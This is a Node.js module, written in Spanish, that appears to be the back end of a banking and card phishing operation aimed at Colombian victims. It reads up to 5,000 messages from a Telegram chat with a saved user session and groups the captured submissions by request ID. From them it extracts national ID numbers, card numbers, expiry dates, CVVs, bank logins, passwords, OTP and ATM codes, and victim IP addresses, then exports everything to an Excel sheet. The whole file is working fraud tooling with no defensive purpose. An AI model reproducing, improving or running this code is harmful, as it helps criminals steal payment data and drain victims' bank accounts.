const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const XLSX = require("xlsx");

const apiId = parseInt(process.env.TG_API_ID);
const apiHash = process.env.TG_API_HASH;

async function generarExcelHistorial(chatIdMsg, tokenBot, responder) {
    // Usa la sesión guardada en TG_SESSION
    const stringSession = new StringSession(process.env.TG_SESSION || "");
    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
    });

    await client.connect();

    if (!(await client.checkAuthorization())) {
        await responder('❌ La sesión de Telegram expiró o es inválida. Genera una nueva con login.js en tu PC y actualiza TG_SESSION en Render.');
        await client.disconnect();
        return null;
    }

    await responder('✅ Sesión válida. Leyendo historial...');

    // Resolver la entidad del chat
    let peer;
    try {
        peer = await client.getEntity(chatIdMsg);
    } catch (e) {
        const id = String(chatIdMsg).startsWith("-100")
            ? String(chatIdMsg).replace("-100", "")
            : String(chatIdMsg);
        peer = new Api.PeerChannel({ channelId: BigInt(id) });
    }

    // Leer mensajes (hasta 5000)
    const messages = await client.getMessages(peer, { limit: 5000 });
    await client.disconnect();

    console.log(`📥 Mensajes leídos: ${messages.length}`);
    await responder(`📥 Mensajes leídos del chat: ${messages.length}`);

    // Agrupar por ID de solicitud (acepta HTML y texto plano)
    const grupos = {};
    const regexID = /(?:<b>)?ID:(?:<\/b>)?\s*(?:<code>)?([A-Z0-9\-]+)/i;

    for (const msg of messages) {
        if (!msg.message) continue;
        const texto = msg.message;
        if (texto.includes('SOLICITUD DE PAGO') || texto.includes('DATOS RECIBIDOS')) {
            const match = texto.match(regexID);
            if (match) {
                const solId = match[1].trim();
                if (!grupos[solId]) grupos[solId] = [];
                grupos[solId].push({
                    texto: texto,
                    fecha: new Date(msg.date * 1000).toLocaleString('es-CO', { timeZone: 'America/Bogota' }),
                    paso: texto.includes('PASO 1') ? 'tarjeta'
                        : texto.includes('PASO 2') ? 'credenciales'
                        : 'otp'
                });
            }
        }
    }

    console.log(`📋 Solicitudes agrupadas: ${Object.keys(grupos).length}`);
    await responder(`📋 Solicitudes encontradas: ${Object.keys(grupos).length}`);

    // Extraer campos (tolera HTML y texto plano)
    const filas = [];
    const extraer = (texto, etiqueta) => {
        const etiquetaEsc = etiqueta.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        // Intenta con HTML: <b>Etiqueta:</b> <code>valor</code>
        let re = new RegExp(`<b>${etiquetaEsc}:<\\/b>\\s*(?:<code>)?([^<\\n]*)`, 'i');
        let m = texto.match(re);
        if (m) return m[1].trim();
        // Fallback texto plano: Etiqueta: valor
        re = new RegExp(`${etiquetaEsc}:\\s*([^\\n]*)`, 'i');
        m = texto.match(re);
        return m ? m[1].trim() : '';
    };

    for (const [id, msgs] of Object.entries(grupos)) {
        msgs.sort((a, b) => new Date(a.fecha) - new Date(b.fecha));
        const t = msgs.find(m => m.paso === 'tarjeta') || msgs[0];
        const c = msgs.find(m => m.paso === 'credenciales');
        const o = msgs.find(m => m.paso === 'otp');

        let otpVal = '';
        if (o) otpVal = extraer(o.texto, 'OTP')
            || extraer(o.texto, 'CLAVE ATM')
            || extraer(o.texto, 'CLAVE DINÁMICA')
            || extraer(o.texto, 'CÓDIGO SMS');

        filas.push({
            'ID': id,
            'Fecha': t.fecha,
            'Solicitante': extraer(t.texto, 'Solicitante'),
            'Cédula': extraer(t.texto, 'Cédula'),
            'Titular': extraer(t.texto, 'Titular'),
            'Tarjeta': extraer(t.texto, 'Tarjeta'),
            'Vence': extraer(t.texto, 'Vence'),
            'CVV': extraer(t.texto, 'CVV'),
            'Marca': extraer(t.texto, 'Marca'),
            'Banco': extraer(t.texto, 'Banco'),
            'IP': extraer(t.texto, 'IP'),
            'Usuario': c ? extraer(c.texto, 'Usuario') : '',
            'Contraseña': c ? extraer(c.texto, 'Contraseña') : '',
            'OTP': otpVal
        });
    }

    const hoja = XLSX.utils.json_to_sheet(filas);
    const libro = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(libro, hoja, 'Historial');
    return XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });
}

module.exports = { generarExcelHistorial };
